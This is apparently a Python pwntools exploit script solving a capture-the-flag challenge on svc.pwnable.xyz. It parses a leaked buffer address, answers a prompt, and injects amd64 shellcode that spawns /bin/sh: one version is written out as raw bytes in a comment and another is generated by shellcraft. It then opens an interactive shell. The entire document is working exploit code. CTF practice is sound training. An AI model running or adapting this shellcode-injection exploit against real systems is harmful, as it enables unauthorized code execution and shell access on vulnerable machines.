#!/usr/bin/python 
from pwn import *

context.log_level = 'debug'
context.arch = 'amd64'
#p = process("./challenge")
p = remote("svc.pwnable.xyz", 30025)
elf = ELF("./challenge")

p.recvuntil("POW: x + y == ")
buf = int(p.recvline().strip(), 16)
log.info("buf : "+hex(buf))
p.sendlineafter("> ", '0 '+str(buf))

#shellcode = "\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x56\x53\x54\x5f\x6a\x3b\x58\x31\xd2\x0f\x05"

shellcode = asm(shellcraft.amd64.sh())

pay = p32(0)  + shellcode
p.sendafter("Input: ", pay)

p.interactive()
